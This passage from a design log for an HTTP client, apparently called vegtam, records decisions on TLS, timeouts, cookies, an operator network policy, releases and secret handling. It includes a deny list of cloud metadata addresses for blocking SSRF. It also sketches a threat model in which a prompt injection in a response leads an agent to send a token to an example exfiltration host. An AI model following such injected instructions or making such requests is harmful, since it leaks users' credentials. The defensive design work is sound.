  error. The transport with the certificate refuses an https proxy:
  net/http hands the proxy's TLS connection the same config.
- **TLS files.** `--cacert` adds to the system's roots, unlike curl's: a
  company's CA comes on top of public sites, not in their place. Keys are
  PEM and unencrypted; an encrypted one is refused with a hint to
  `--key <(openssl pkey -in key.pem)`, which leaves no decrypted file.
  `SSLKEYLOGFILE` is not read; a test checks it.
- **`--insecure` for a person only.** It works when stdin and stdout are
  terminals and `--json` is not given; otherwise it is a usage error. A
  script or an agent can be led by what a file or a response says, and
  the agent writes the argv itself, so a flag alone does not stop it;
  the operator's policy file is the place to allow it for a host. Every
  run with it says so on stderr, and the status line of the interface
  says so while it is open. `tls_verified` is false over plain http too,
  and if any hop of the redirects was: what a program wants to know is
  whether anything on the way could have read or changed the exchange.
- **Three limits.** connect (10s) covers the whole of getting a
  connection, DNS, TCP, a proxy's CONNECT and the TLS handshake, so that
  a host that does not answer fails fast; the dialer's and the
  handshake's own limits do not cover a proxy, so a timer from the
  request's trace does. read (30s) is how long the server may send
  nothing once the request is written, for the headers and between reads
  of the body, a redirect's included; net/http has no such limit, so a
  timer that the trace and the body's reads restart cancels the request
  with a cause of its own. total (`--max-time`, 2m) bounds the whole
  exchange. With the old
  single 30s, a read timeout of 30s could never end a request first; 2m
  lets a response that keeps coming finish, and still bounds the wait
  of an agent. These numbers are a starting point, to check against real
  APIs. A directive may lower a limit and never raise it, with
  JetBrains' units; httpyac's bare milliseconds read as seconds are then
  held to the flag's limit. The error says which limit ran out, from the
  cause of the request's context or from the trace, in `timeout_phase`.
  `--timeout` stays as the old name of `--max-time`, with a warning of
  vegtam's own: pflag's notice would go to stdout, into the JSON.
- **HTTP versions.** A version weakens nothing, so the request line and
  the flags are equals, and the flag wins. `HTTP/2` means HTTP/2 or an
  error: a fault that shows only on HTTP/2 must not hide behind a quiet
  fallback, and over plain http net/http would speak HTTP/1.1 without a
  word, so that is refused before sending. HTTP/3 is not supported.
- **Unknown stays an error.** Only the directives of other clients that
  vegtam knows are warnings; one that no client has is an error as
  before: a mistyped `@asert` must not drop a check and exit with 0.
  Warnings go to stderr and into `warnings` in JSON, those of the
  environment files once, with the first request of their directory.

## 2026-10-20: diagnostics and cookies

- **No raw dump.** `--verbose` and the JSON say what a request went
  through, and every part of it goes through the masker: a `Location`, a
  proxy's password, the issuer of a certificate. What names a host that
  holds a secret is hidden whole, since the masker, which works by
  value, would miss the host in another letter case or a domain above
  it: its address, the subject of its certificate, the domain of its
  cookies; the reasons a cookie was refused name no host. There is no
  mode that prints the exchange as it is, and there will be none: curl's `-v` and `--trace` print
  `Authorization` and `Cookie` as they are, which its maintainer says
  nothing guarantees against, and an agent reads whatever is printed.
- **A trace per hop.** Each hop of a request gets its own hooks, which
  keep the time limits as before and record its phases: a hook that
  fires late, such as for the connection that lost the race of Happy
  Eyeballs, cannot land in the next hop. The address is that of the
  first connection made, known before the TLS handshake, which may fail.
  The diagnostics come after an error too: a request that hangs is what
  they are for. A handshake that fails still names the certificate the
  server sent, from Go's verification error, which says what CA to
  trust.
- **curl's names, in the timing there was.** The phases are curl's and
  Hurl's (`name_lookup`, `connect`, `app_connect`, `start_transfer`),
  each from the start of the request to the end of the phase, summed
  over redirects as libcurl does, with the `_ms` that every duration of
  the schema has. They join `timing`, which had `total_ms`: a second
  object, `timings`, beside it would have said the total twice. A phase
  that did not happen is absent, not 0. `reused` is true when no
  connection was made at all, so that the phases then hold no connect
  time. The text form gives each hop its own line and times, which are
  easier to read than sums.
- **A jar in memory, for a run.** `.http` files sign in with one request
  and use the session in the next; without a jar that breaks without a
  word, and every `.http` client has one on. It is never written to
  disk: net/http's jar cannot be saved whole (`Cookies` gives names and
  values only), the file would hold sessions, and cookies carried from
  one run to the next would make a run depend on what ran before. One
  jar per session: a run of the CLI, an environment in the interface.
- **The public suffix list is required.** Go's documentation calls a jar
  without it not secure: any site could set a cookie for all of co.uk.
  `golang.org/x/net/publicsuffix` is the one new dependency; it moved
  `golang.org/x/sys` from 0.47 to 0.49, which `x/net` requires.
- **net/http's jar decides where a cookie goes.** vegtam does not match
  domains and paths itself: it refuses, in front of net/http's jar, what
  RFC 6265bis refuses and that jar takes, a `Secure` cookie set over
  http or one from http that would replace a `Secure` one, a `__Secure-`
  or `__Host-` prefix without what it needs, and keeps what it took, to
  count cookies against the limits (4096 bytes, 50 a site, 300 in all)
  and to say which were sent. net/http's limit, after CVE-2025-58186, is
  on how many cookies one response may set, 3000, past which it takes
  none; a test checks it, and others the jar's own. A `Domain` or `Path` over 1024 bytes refuses the cookie,
  where RFC 6265bis ignores the attribute: stricter, and no copy of a
  cookie to change. A host that is not ASCII keeps no cookie: net/http's
  jar turns it into punycode first, and the count would not match.
- **`Secure` means https, localhost too.** net/http's jar, as browsers,
  takes and sends a `Secure` cookie over http to localhost, to a loopback
  address and to any host under localhost. But net/http sends a request
  to `LOCALHOST`, `localhost.` or `api.localhost` through `HTTP_PROXY`,
  in clear, and a `__Host-` session would go to a proxy that way.
  vegtam takes and sends a `Secure` cookie over https only. A
  development server on http that sets `Secure` cookies gets them
  refused, and the output says why.
- **`@no-cookie-jar` is strict.** JetBrains reads it as "do not keep
  what this response sets"; kulala as "neither send nor keep". vegtam
  takes the stricter: the request neither reads the jar nor writes it,
  so that it goes out as its file says.
- **A cookie's value is a secret.** The output names cookies, never
  their values. In `Set-Cookie` headers the value is `***` whatever its
  length; elsewhere, values of 8 bytes and more are masked, such as a
  session a body echoes. A shorter one, `lang=en` or `seen=1`, is no
  credential, and masking every `en` and `1` of the output would make it
  unreadable, which a server could do on purpose. The values the jar
  keeps are masked as long as it keeps them; of the others, refused,
  removed or replaced, the latest 256, and none over 4096 bytes: the
  masker is made anew for each request, and a server that set cookies
  without end could make it as large and slow as it liked.
- **Basic from the secrets.** `Authorization: Basic {{user}}
  {{password}}` goes as base64, as in JetBrains, REST Client and
  httpyac, so that a password stays in the private file. The words are
  split on the text as written, so that a secret may hold a space. The
  base64 form is a form of the secret: the masker hides the base64 of
  every secret value, and a session adds the `user:password` of each
  such header. As a curl command it is `-u`, which curl encodes and,
  like vegtam, does not send to another host.

## 2026-10-20: network policy

- **A policy of the operator's, in one place.** What weakens a check or
  belongs to the machine is the operator's to allow, and a flag is not
  enough for that once no person is at a terminal: an agent writes its
  argv itself, and a file or a response may lead it. So the operator
  writes `$XDG_CONFIG_HOME/vegtam/policy.json`, beside the trust store,
  and vegtam reads it from there alone: never from a directory of
  `.http` files, nor from the current one, nor from an environment file,
  all of which can come with a repository. Its directory is opened as
  an `os.Root`, and a file or a directory that others can write is
  refused, as the trust store refuses one; a file others can read is a
  warning, since it holds no secret but says what vegtam may do.
- **JSON, not TOML.** TOML was the other candidate; the trust store is
  JSON already, the standard library reads it, and no parser joins the
  dependencies for a file of a dozen fields. An unknown field is an
  error, so that a misspelt `alow` does not allow nothing without a
  word, and so is a file that does not parse: an empty policy in its
  place would drop its ceilings.
- **One order, one function.** The transport of a run is made by
  `merge` in the CLI, in one order for every setting: what vegtam does
  on its own, then the policy, then the flags; the directives of a
  request may then only lower its limits, in `exec.Client.Settings`.
  A table test goes through each step. The ceilings of `limits` hold the
  flags, and so the directives: a flag above one is a warning, and the
  ceiling holds, as a directive above a flag is a warning and the flag
  holds.
- **No person at a terminal.** A run is without a person when stdin or
  stdout is not a terminal, or `--json` is given, the same rule that
  `--insecure` has had, and the one thing vegtam can tell. It catches
  the CI scripts that a person writes too; for them, the way to allow
  is the same policy. Such a run
  takes what weakens a check from the policy alone: `--insecure` leaves
  unchecked only the hosts of `network.insecure_hosts`, and is an error
  without them.
- **The guard is at the connection.** The dialer's `ControlContext`
  checks the address each connection is made to, after the lookup, on
  every hop and every new connection, as OWASP's SSRF cheat sheet asks:
  a check of the name before the request would let DNS rebinding through,
  and a check of the first hop only, a redirect. It runs before the
  connection is made, so nothing is sent to an address refused.
- **What is never connected to.** The metadata services of clouds hand
  the credentials of the machine to any request that reaches them; the
  list in `netguard` names each address with its cloud: 169.254.169.254
  (AWS, Azure, Google Cloud, Oracle Cloud, DigitalOcean, OpenStack),
  169.254.170.2 (AWS ECS), 169.254.170.23 and fd00:ec2::23 (AWS EKS Pod
  Identity), fd00:ec2::254 (AWS over IPv6), fd20:ce::254 (Google Cloud
  over IPv6), fd00:c1::a9fe:a9fe (Oracle Cloud over IPv6), 192.0.0.192
  (Oracle Cloud Classic), 100.100.100.200 (Alibaba Cloud) and
  168.63.129.16 (Azure's WireServer). Link-local, multicast and
  unspecified addresses (`0.0.0.0/8` too, which Linux connects to the
  host itself) are no single host's. These are refused with a person at
  a terminal too, and `network.allow` cannot allow them. An IPv4 address
  written as IPv6, mapped or behind the NAT64 prefix of RFC 6052, is
  checked as the IPv4 address it carries. Behind a NAT64 prefix of local
  use (RFC 8215), whose length is the network's, it is read as under a
  /96, the usual one, to refuse what is never connected to; the rest is
  private, since which address it carries is not known.
- **Private only as allowed.** Without a person, loopback, RFC 1918, the
  shared space of RFC 6598 and the unique local addresses of IPv6 are
  refused unless `network.allow` names them, by address, prefix, or
  name and port; a name needs its port, so that allowing `localhost:3000`
  does not allow every service of the machine. With a person they are
  allowed: localhost is what a developer most often calls. The error
  names the entry to write, `allow it in policy: network.allow`, and is
  of kind `policy`, exit code 6, which the trust store's errors have.
- **The guard and a proxy.** Behind a proxy the dialer sees only the
  proxy's address. So the proxy function looks the target up and checks
  every address it has, with the same rules, before the proxy gets the
  request; a target
  that does not resolve here, as behind a proxy that resolves names
  itself, or only to an unspecified address, as a DNS that blocks a name
  answers, passes with a person at a terminal and is refused without one
  unless `network.allow` names it with its port. The host is read as a
  proxy may read it: first as net/http sends it, a name not in ASCII as
  IDNA writes it (so that
  digits of full width are digits), then as a number, since Go's
  resolver does not read `2852039166` or `0251.0376.0251.0376`, which
  glibc and so many a proxy read as 169.254.169.254: in every reading
  of `inet_aton`, of the WHATWG URL standard and of leading zeros as
  decimal, refused if any is. The lookup is bounded by the connect
  timeout, a lookup that gets no answer in that time being a timeout of
  the connect phase rather than a refusal, and kept out of the hop's
  trace, whose `name_lookup_ms` is the proxy's. It tells the local
  resolver every name, with `socks5h` too: the price of refusing
  metadata through a proxy, which a person at a terminal pays as well.
  The proxy may still see another address than vegtam did; its own rules
  are the last word.
  Without a person, the proxy of the environment is not used unless
  `network.proxy` says `"environment"`: whoever sets the environment of
  a script or an agent would choose where its requests go, and a
  warning says it is not used. The proxy, the policy's or the
  environment's, is the operator's: the guard lets a connection to it
  be when it is made to it as the proxy, and checks one to its address
  as any other, since net/http sends a request for loopback direct. A
  request that `--insecure` leaves unchecked does not go through an
  https proxy: net/http checks the proxy's certificate with the same
  config, and would hand the proxy's credentials to whoever answered.
  That refusal, and the older one of an https proxy with a client
  certificate, are usage errors, exit code 2: the flags and the policy
  conflict, and a retry would not help.
  `httpproxy.Config.ProxyFunc` reads `no_proxy` and the
  environment for each run, where net/http's `ProxyFromEnvironment`
  reads it once a process; it brings `golang.org/x/text`, through
  `idna`, and moved `golang.org/x/sync` to 0.24, which `x/text`
  requires.
- **What binds it.** The policy holds against what vegtam's arguments,
  its files and the responses say. It is found through `XDG_CONFIG_HOME`
  or `HOME`, as the trust store is: a program that sets vegtam's
  environment can name another, as it could run another client. A
  system path that only root can write would bind such a program too;
  that is a choice for later, and the documentation says how to run an
  agent meanwhile. A named pipe in place of the policy or of the trust
  store is refused before it is opened, rather than waited on for ever.
- **Not yet.** The history of runs stays off with `VEGTAM_NO_HISTORY`,
  not in the policy; the policy's TLS by host, the credentials of its
  proxy, `--proxy`, `--resolve`, `--connect-to` and unix sockets come
  next.

## 2026-10-20: routes, sockets, and TLS by host

- **The policy's TLS is by origin.** `hosts` gives an origin CAs trusted
  for it alone, on top of the system's and `--cacert`'s, and a client
  certificate offered to it alone, as Postman, Bruno and REST Client
  bind a certificate to a host. It goes to that origin on any hop,
  since the operator bound it there; the certificate of `--cert` keeps
  its place on the request as written. Each is part of the key of the
  transport: no connection is shared across them. Paths are absolute or
  `~/path`, and a key others can read is refused, as ssh refuses one.
- **The proxy's credentials never in a file or the arguments.**
  `network.proxy_auth` and `--proxy-auth` name an environment variable,
  `$env NAME`, that holds `user:password`; a proxy URL with a user or
  password is refused, in the policy and in `--proxy`. They go to the
  proxy alone, as net/http sends them: on CONNECT for https, to the proxy
  for http. The policy's go to the policy's proxy and to no other, not to
  a person's `--proxy` nor to the environment's, which whoever sets the
  environment chooses; `--proxy-auth` is for a person at a terminal. No
  request may read the variable: `{{$env NAME}}` of it is a policy
  error, since a file could otherwise send the credentials anywhere,
  masked in the output. A test proxy shows that the server never gets them through
  the tunnel, and that a proxy that refuses CONNECT ends the request
  there, where curl's CVE-2026-86414 sent them on to the server. The
  output hides the pair whatever its length, and its base64, and each
  part alone from 8 bytes.
- **`--proxy` for a person, `--noproxy` for all.** Without a person,
  requests go through the operator's proxy or none, so `--proxy` is a
  usage error. `--noproxy` is taken in every mode: a request that goes
  direct is one the guard sees whole. In Go, `socks5` is `socks5h`: the
  proxy looks the name up.
- **Routes as curl has them, and only as flags.** `--resolve` and
  `--connect-to` keep the URL's host for the Host header and TLS, and the
  guard checks the address connected to. A route on a file would send a
  trusted host's requests, and their secrets, to another address, so
  `@resolve` and its kin are refused, and without a person a route must
  be one that the policy lists, compared as the flag writes it. A
  request to a routed host does not go through a proxy, which would look
  the name up itself: an error says to pass `--noproxy`. Routes are for
  the hosts of requests, not for the proxy, which the guard lets be as
  the proxy alone. A port and a name match as net/http dials them,
  leading zeros dropped and a name not in ASCII as IDNA writes it.
  `resolved_by` says in the output which flag sent a connection where it
  went.
- **The policy's CAs do not vouch for a proxy.** net/http checks an https
  proxy with the config of the request's origin, so a request to an
  origin that the policy gives CAs of its own does not go through an
  https proxy, as one with a client certificate or `--insecure` does
  not.
- **Sockets.** `--unix-socket` sends every request to the socket, as
  curl does, with the URL's host in `Host` and no proxy; on Linux,
  `--abstract-unix-socket` names one of the abstract namespace. Docker's
  socket is root on the machine, so a socket is never from a file, and
  without a person it must be one that `network.unix_sockets` lists,
  compared by the path its links lead to, which is then the path
  connected to, so that a link changed after the check leads nowhere
  new. `--unix-socket @x` is a file, as curl reads it; only
  `--abstract-unix-socket` names an abstract socket. The guard has no
  address to check there.

## 2026-10-20: the agent contract

- **Confirmation without a person.** A script or an agent, which a file
  or a response may lead, sends a request whose method is not GET, HEAD
  or OPTIONS only with `--confirm`; without it, the request is an error
  of kind `confirm`, exit code 5, which the root help had kept for it.
  It fails closed: TRACE, CONNECT and any method vegtam does not know
  need it too. Beside the message, `error.confirm` names the method, the
  URL and the flag that confirms it. The URL is as written, its
  placeholders unresolved, so that no value of a variable shows, and
  masked all the same; the result's ref names the request.
- **One place, strict by default.** The session, which the CLI and the
  terminal interface send through and nothing else, refuses such a
  request, and the zero value of its option is the strict one: a caller
  that forgets to set it sends nothing that needs a confirmation. It
  refuses in `Prepare`, before the request is resolved: nothing is sent
  and no `{{$cmd NAME}}` runs. Its command file's trust is not checked
  then either, so a request that lacks both says 5 first, and 6 after
  `--confirm`; a dry run says both at once. The terminal interface asks,
  and tells the session that a person answered, for that one send. The
  captures of a refused request are lost, as those of one that failed,
  and the history keeps it with the result `confirm`, as it keeps one
  that failed before it was sent.
- **`--confirm` and its `=`.** `--confirm` alone confirms every request
  of the run, and `--confirm=file#name,file#N` those it names, which must
  be requests of the run, compared by absolute path and by position, or
  the run is a usage error before anything is sent: a typo must not let
  the run go on as if it had confirmed something. The value is optional,
  through pflag's `NoOptDefVal`, so it needs the `=`: `--confirm
  api.http#a` is `--confirm` and an argument, and `run` takes one, so
  with a target as well it is a usage error; alone, the argument is the
  target, and `--confirm` confirms its requests and no others. The value
  of `--confirm` alone is `all`, which no ref can be, having no `#`.
- **"never" is the policy's alone.** `network.confirm: "never"` lifts the
  rule for runs without a person, for an operator who trusts whatever
  runs vegtam, such as CI over reviewed files. It weakens a check, and
  whoever writes the arguments, the environment or a `.http` file is
  what the check is for, so no flag, variable or file can say it: only
  the operator's file, as for every other weakening. An unknown value is
  a policy error, exit code 6, as other bad values are. `vegtam policy`
  says which rule applies, in `run.confirm_mutations`.
- **A person's run is not asked.** `vegtam run` at a terminal sends any
  method, as before. The person typed the command and its argument; a
  question would teach them to answer yes, and break the loops they
  write in a shell. The terminal interface still asks, since there one
  key sends whatever the cursor is on.
- **`@note` asks for a person.** httpyac shows the text of `# @note` and
  asks before sending; vegtam ignored it with a warning, so that a
  file's own request for a person went unheard. A request with one is
  now sent only once confirmed, in every mode: the terminal interface
  asks, for a GET too, with the note in its question, and `vegtam run`
  refuses it with exit code 5 and the note until `--confirm`, a person's
  run too, since one who runs a directory may not have read every file.
  `network.confirm: "never"` does not lift it: the operator trusts the
  program that runs vegtam, and the file's author asked for a person.
  The text may be empty; it comes from the file, so it is masked and
  shown with escapes on a terminal, as all such text is, and is given
  whole after the message's colon: quoting it would hide a secret value
  in it from the masker.
- **Dry runs say what would be asked.** A dry run sends nothing and needs
  no confirmation; its result has `confirm` when a run with the same
  flags would refuse the request, so that a program can ask a person
  once, for every `--confirm=` it needs.
- **`vegtam describe`.** One document for a program that meets vegtam:
  the version, the commands and their flags, the exit codes and the
  kinds of error, the mode and why, the policy as `vegtam policy` prints
  it, what vegtam never does, and where the schema and the history are.
  The commands and flags come from the command line itself, hidden and
  deprecated ones left out, and the exit codes from the table that the
  root help is now built from, so that neither drifts; a test holds the
  kinds of error to their codes. A policy file that cannot be read does
  not stop it: a program calls describe first, and should learn why
  every other command would exit 6, so the document comes whole, with
  `policy_error` in place of `policy`, and the exit code is 6. Each claim
  of `never` is one that the code holds, and its tests check.
- **One contract.** `docs/AUTOMATION.md` is the contract for programs:
  how to run vegtam, what the modes allow, how to confirm, what the
  operator decides. `vegtam describe` is its summary at run time. There
  is no other file of instructions for them, which would drift from it.
- **show reads only what it needs of the policy.** It sends nothing,
  so it takes the ceilings of the time limits and the variable that no
  request may read, and leaves TLS by host and the proxy's credentials
  alone: a CA file that cannot be read or a `proxy_auth` variable that
  is not set made it exit 6, though nothing would have gone out.
- **Basic in one word.** `Basic {{user}}:{{password}}`, as REST Client
  and httpyac write it, goes on the wire as the two words of JetBrains
  do, base64 and all, and its credentials are masked as theirs are. A
  colon in the text marks it, split at the first: base64 has none, so
  an encoded value is never taken for the shortcut. A colon inside a
  secret does not count, since what a file writes, not what a secret
  holds, decides how the header goes: `Basic {{credentials}}`, a
  secret, is sent as it is, as before. A plain variable's value is text
  by then, as in REST Client.

## 2026-10-20: releases

- **GoReleaser v2, with the release step off.** One file says how each
  target is built, packed and summed, and `goreleaser check` checks it;
  a script of `go build` and `tar` would have to get each of those
  right by hand, file times and owners included. GoReleaser is a tool
  of the maintainer's, like golangci-lint, and not in `go.mod`. For now
  `release.disable` is on and the changelog off: a build of a tag writes
  `dist/` and stops, with no token, and a maintainer puts the archives
  on the release on GitHub. docs/RELEASE.md names the version the
  configuration was checked with, v2.18.3.
- **No signing, no Homebrew, no images yet.** Each needs what does not
  exist yet: a signature a key, and a place where users find its public
  half; notarization an Apple developer account; a Homebrew tap or a
  Scoop bucket a repository of its own; an image a registry, and a
  reason, for a client that runs on the operator's machine. The first
  to come are a signature of `checksums.txt`, so that a download can be
  traced to the maintainer and not only to the sums, and a tap. Until
  then an archive is checked by its sum, and RELEASE.md says how
  to run a binary that macOS holds in quarantine.
- **Reproducible from the commit.** The date stamped is the commit's,
  `{{ .CommitDate }}`, not the build's: a build date makes every build
  differ, and says nothing about the code. The binaries' file times
  (`mod_timestamp`) and those of the files in the archives are the
  commit's too, and the archives name root as the owner and fix the
  modes, so that neither the clock, nor the user, nor the umask of the
  build reaches them. `-trimpath` keeps out the path of the checkout.
  With cgo off no C toolchain of the machine takes part, and a binary
  runs on any Linux, with no C library to match. Neither the path of
  the clone, nor its umask or file times, nor the build cache changes a
  byte: what is left to match is the version of Go and of GoReleaser,
  which RELEASE.md names.
- **Stamped, else what Go recorded.** The linker flags stamp the
  version, the commit and its date. A binary of `go build` or
  `go install` has none of them, yet the go command records the
  module's version (`go install ...@v0.1.0`) and, in a git checkout,
  the commit, its time and whether files had changes. `vegtam version`
  takes each value not stamped from there, so that a bug report names a
  commit however the binary was made. The function that does so is
  given the `debug.BuildInfo`, so that the tests give it every case by
  hand; the test binary records no commit. "+dirty" after the commit
  says the files built had changes, as Go marks a version, and the date
  and "+dirty" are taken for the commit the build information names
  only, not for one stamped by hand. A release says `0.1.0`, GoReleaser's
  version, without the tag's `v`; `go install` of the tag says
  `v0.1.0`, as Go writes it. Each is left as its tool writes it.
- **The version document only grows.** `commit` and `date` join
  `name`, `version`, `go`, `os` and `arch`, which keep their names and
  values, and a value that is not known is absent, as elsewhere in the
  JSON: a program that read the old document reads the new one. It has
  no `schema_version`, and the JSON Schema does not describe it. The
  text stays one line, for a bug report, with the commit cut to the 12
  characters of Go's pseudo-versions; the JSON has all of it.

## 2026-10-20: CI on GitHub

- **A mirror of the gate.** A GitHub Actions workflow runs `make check`
  on each pull request and each push to `main`; its own steps only set
  up the tools and check their versions. `make check` before every merge
  stays the gate; the workflow shows the same result on a clean machine,
  for every pull request. docs/CI.md says what it adds.
- **Pinned by commit and by sum.** The actions are named by the commit
  of their latest release, golangci-lint by the SHA-256 of its archive,
  written in the workflow, and Go by the `toolchain` line of `go.mod`,
  which a step checks once setup-go is done: setup-go v7.0.0 ignores
  that line under `GOTOOLCHAIN=local`, so its step alone runs with
  `auto`. No token is kept, no secret used, and nothing is cached
  between runs: a build cache from an earlier run is code that nothing
  checks.
- **The baseline from `main`.** checkout makes no `origin/main` for a
  pull request, and without it the Makefile would take the suppression
  baseline from the pull request. The workflow fetches `main` first,
  and refuses to run the gate without the baseline there.

## 2026-10-20: a hint from what the server sent

- **The server's bytes, not Go's words.** With `HTTP/2 (Prior Knowledge)`
  over http, a server that does not speak h2c answers the client's
  preface with an HTTP/1.1 status line, or closes or resets the
  connection. net/http reports that in words that change with the
  timing: its reader can end the connection before the request is on
  it, and the request then fails with `http2: client conn could not be
  established` instead of the frame error. The hint matched the words of
  the frame error and missed the others, which show up readily under
  `GOMAXPROCS=1`. A connection that speaks HTTP/2 with
  prior knowledge over http now keeps the first bytes the server sends.
  An HTTP/2 server begins with a SETTINGS frame (RFC 9113, 3.4), so
  anything else first, or a connection broken before a frame, gives the
  hint, whatever the error says; a server that sent SETTINGS gets none.
  The request must have had the connection: one that fails while it is
  made, before the client's preface is out, is the network's error.
  Through a SOCKS proxy, which carries the request's own bytes, what the
  server sends counts from the client's preface, as the proxy answers
  first; an http proxy is spoken to itself, and gets no hint.

## 2026-10-21: releases from GitHub Actions

- **A tag publishes the release.** A tag pushed to GitHub runs
  `.github/workflows/release.yml`, and GoReleaser publishes the release
  of it: its release step and the changelog are on, and no file is
  attached by hand. This replaces what "2026-10-20: releases" said of
  the release step, the changelog and signing; its reasons for
  GoReleaser and for builds reproducible from the commit stand. A
  release built on GitHub's machines is checked as any build is: a
  build of its tag elsewhere, with the same Go and GoReleaser, gives
  the same sums.
- **The gate cannot write or sign.** The workflow's token can only read.
  Its `gate` job runs `make check`, and with it the tag's code, its
  tests and the linters, with that token and without `id-token: write`:
  nothing it runs can change a release, or get a token to sign as the
  workflow. The `release` job starts once the gate has passed, with
  `contents: write` and `id-token: write`, and runs only setup steps,
  GoReleaser and cosign; `GITHUB_TOKEN` goes to the GoReleaser step
  alone.
- **cosign, keyless.** `checksums.txt` is signed, and through it each
  file it lists. A keyless signature leaves no key to keep, or to leak:
  cosign gets a certificate from Sigstore that lasts minutes and names
  the workflow at the tag,
  `https://github.com/vidforull/vegtam/.github/workflows/release.yml@refs/tags/<tag>`,
  for which GitHub's OIDC token vouches. The signature ties the sums to
  that workflow, not to a person's key. The bundle,
  `checksums.txt.sigstore.json`, carries the certificate and the entry
  of Sigstore's transparency log, so that `cosign verify-blob` needs
  nothing else. The run verifies it once itself, with that exact
  identity: a signature that does not verify fails the run that made
  it. An Apple signature and notarization still need a developer
  account, and are not done.
- **`.deb` and `.rpm`, as reproducible as the archives.** nfpm, inside
  GoReleaser, packs the Linux binaries with `LICENSE` and `README.md`,
  with the commit's time on every file and on the package, root as the
  owner, and fixed modes. An `.rpm` records the host that built it, the
  machine's own name unless `rpm.buildhost` is set: two hosts made two
  different packages, so it is set, to `reproducible`. The version
  inside keeps the `~` that nfpm puts before a pre-release part,
  `0.1.0~rc.1`, which dpkg and rpm sort before `0.1.0`, so that the
  version upgrades its candidates. The file names have `-` in its
  place: GitHub renames an asset with a `~`, and `checksums.txt` would
  then name a file that the release lacks.
- **No package repository or tap yet.** An apt or yum repository needs
  a host and a signing key of its own, and a Homebrew tap a repository
  of its own. Each waits until after the first release: the packages
  are tried first as files of a release.
- **The tag that was pushed.** The release job sets
  `GORELEASER_CURRENT_TAG` to the tag of the run. A version shares its
  commit with its last candidate, and GoReleaser, left to choose, takes
  the first tag of the commit in `-version:refname` order, which puts
  `v0.1.0-rc.2` before `v0.1.0`.
- **GitHub only, and only from `main`.** Another server that holds the
  repository may run `.github/workflows`; both jobs run only when the
  server is github.com and the repository `vidforull/vegtam`. The gate
  refuses a tag whose commit is not on `main`: a release is made of
  what was merged, not of a branch that was tagged.
- **Pinned by commit.** checkout and setup-go are those of check.yml;
  cosign-installer v4.1.2 and goreleaser-action v7.2.3 are named by the
  commits that GoReleaser's own release workflow names for them. The
  installer's commit fixes the version of cosign it installs, and the
  workflow names GoReleaser's version, the Makefile's.
- **Notes without docs and tests.** The changelog lists the commits
  since the previous tag, sorted, without those whose subject starts
  with `docs:`, `readme:` or `test:`: they change no behaviour.
  `readme:` is this repository's area for the README.

## 2026-10-24: secrets have origins

- **The threat.** A `.http` file and its `http-client.env.json` come
  with the requests, often from someone else: a cloned repository, a
  pulled change. A response can lead a program too, as a prompt
  injection in a body that tells an agent to "now check this URL" does.
  Either way, a request such as `GET https://exfil.example/c?t={{token}}`
  is run, or the same with `{{$env TOKEN}}`, `{{$cmd TOKEN}}` or a
  captured `{{session}}`. Until now the network guard let it pass, the
  host being public; a GET needed no `--confirm`; and the masker hid the
  value in the output while it went out on the wire. The guard says
  what may be reached and masking what may be printed; nothing said
  where a secret may go.
- **Each secret has origins.** A secret may go to a set of origins,
  `scheme://host[:port]` with the host in lower case and the scheme's
  own port dropped, compared exactly. A request that would send one
  elsewhere, in its URL, a header or its body, is not sent: no lookup,
  no connection. The check is in one place in the core, before each
  hop, so that `run`, the terminal interface and any new way to send
  hold it alike. Basic credentials are two secrets, each checked on its
  own.
- **The requests' files bind nothing.** The `.http` file and the
  public environment file are what the check is for: an `$allow` in
  `http-client.env.json` is ignored with a warning, as its
  `SSLConfiguration` is. The private environment file binds its values
  with `$allow`, and the operator's policy, outside any repository,
  binds `{{$env NAME}}` and `{{$cmd NAME}}` with `secrets`. A capture is
  bound with nothing to declare, to the origin of the response it came
  from: the server that gave the value may have it back, and no other;
  in a dry run, which captures nothing, to the origin of the request
  that would.
- **A file binds only the values it holds.** The private file is found
  from the directory of the `.http` file up, so a cloned repository can
  bring an `http-client.private.env.json` of its own. One that does may
  bind its own values anywhere: they are its author's, and it hides the
  person's file above it, whose values are then not read. It must not
  bind the person's environment variables or commands, which no file
  holds: an `$allow` entry for `$env NAME` or `$cmd NAME` is ignored,
  with a warning that names the entry of the policy to write. The first
  design took the union of the two, the file's `$allow` and the
  policy's `secrets`, as if both were always the person's. A union is
  as wide as its widest part, and the private file is not always the
  person's: through it, a repository could bind
  `{{$env AWS_SECRET_ACCESS_KEY}}` to a host of its own and send it
  there. So the policy alone binds what the machine holds, and the
  refusal says which of the two to write, by the kind of the secret.
- **Nowhere by default.** A secret bound to no origin goes nowhere.
  "Anywhere" would keep every old setup working, and leave the hole
  open for each secret that no one thought to bind. This breaks the
  private files written before it, on purpose: the error names the
  secret, the origin it would go to and the ones it may, and where to
  bind it, so the fix is a line. The Postman import writes `$allow`
  where the export makes the origin plain, and reports the rest.
- **No confirmation without a person.** Without a person the refusal is
  of kind `policy`, exit code 6, and `--confirm` does not lift it,
  though it lifts a method or `@note`: the file or the response that
  asked for the request leads the program, and a confirmation would
  come from the same place. With a person at a terminal it is of kind
  `confirm`, exit code 5, and `--confirm=<ref>` sends it, to the origin
  of that request only, this once; the terminal interface asks, with the
  secret and the origin in its question. The confirmation must name the
  request: the person confirms this one, having seen what it sends and
  where, while `--confirm` alone is given for a whole run before its
  requests are seen. A ref with a comma, which `--confirm=<ref>` cannot
  name, has no flag for it, though `--confirm` alone counts for such a
  ref's `@note`: the files of a run may be someone else's to name, and
  `x,y.http` would otherwise send its secrets on a run confirmed for its
  methods.
- **A Host header is an origin too.** A `Host` header that names
  another host than the URL's sends the request, over the same
  connection, to that host as far as the server is concerned: a CDN or
  a shared server routes by it. So it is a second origin of the
  request, over the URL's scheme, and each secret must be bound to both;
  a value captured from such a request is bound to both.
- **No implicit rules.** An origin is named whole. There are no
  wildcards, and no rule such as "the origin of another private value"
  or "the host of the base URL": each would be something that a file
  from elsewhere could steer, with a `host` in the public file or a
  subdomain under a wildcard. A list of origins is longer to write, and
  says all it allows.
- **Redirects with a secret in the URL.** On a change of origin, the
  headers that hold a secret were already dropped, and a body that
  holds one was not sent again. A URL cannot be dropped: a server that
  passes its query on, as an open redirect does, would carry the token
  to wherever it points. So a redirect to an origin that a secret in
  the URL is not bound to is refused before that hop, as kind `policy`
  in every mode: no person saw where it leads.
- **A plain capture that echoes a secret.** `plain` is the file's word
  that a value is no secret, and a response may echo the token in the
  field it captures. A plain value that holds a known secret value, as
  the masker finds it, is taken as that secret, bound to the origin of
  the response, so that a capture cannot carry a token on under a name
  of its own. A dry run sees no value, and takes a `plain` capture at
  its word.
- **Next: a keeper.** The values still pass through the process that a
